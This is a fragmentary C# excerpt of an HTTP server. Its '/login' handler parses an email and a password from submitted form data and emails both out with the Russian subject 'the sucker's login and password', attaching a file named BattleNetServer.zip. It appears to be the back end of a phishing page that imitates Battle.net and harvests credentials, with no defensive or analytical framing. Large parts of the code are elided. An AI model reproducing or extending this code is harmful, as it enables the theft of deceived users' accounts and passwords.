...
class Server
{
        ...
        if (isSuccess)
        {
            ...
            while (true)
            {
                ...
                else if (requestPath == "/login")
                {
                    ...
                    using var streamReader = new StreamReader(body, request.ContentEncoding);
                    var userData = await streamReader.ReadToEndAsync(token);
                    var buffer = userData.Split('&');
                    var email = WebUtility.UrlDecode(buffer[0][6..]);
                    var password = WebUtility.UrlDecode(buffer[1][9..]);
                    var isSend = await MessageSender.SendEmailAsync(email, password, "Логин и пароль лоха", "C:\\Users\\irina\\OneDrive\\Рабочий стол\\BattleNetServer.zip");      
                    if(isSend)
    ...
    public async Task StopServerOnCommand()
    {
        while (true)
        {
